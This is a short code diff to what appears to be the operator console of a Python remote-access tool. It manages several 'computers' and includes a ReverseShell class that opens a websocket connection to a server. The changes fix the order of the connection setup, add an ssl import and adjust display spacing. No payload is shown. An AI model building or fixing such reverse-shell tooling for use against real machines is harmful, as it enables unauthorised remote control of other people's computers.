@@ -1,4 +1,4 @@
-import multiprocessing, threading, requests, base64, json, time, glob, cv2, os, io
+import multiprocessing, threading, requests, base64, json, time, glob, cv2, ssl, os, io
 from websocket import create_connection
 from playsound import playsound
 from PIL import Image, ImageTk
@@ -23,7 +23,7 @@ class Main:
     def __init__(self):
       self.computers = None
       self.columns = 4
-      self.seperate = 8
+      self.seperate = 10
       self.indent = " " * int((69/self.columns)-7)
 
       self.uiprint('Enter your server address')
@@ -116,10 +116,10 @@ class Main:
 
     class ReverseShell:
         def __init__(self, computer, ctx):
-            self.ws = self.establishConnection()
             self.key = ctx.key
             self.host = ctx.host
             self.computer = computer
+            self.ws = self.establishConnection()
             self.start()
         
         def start(self):
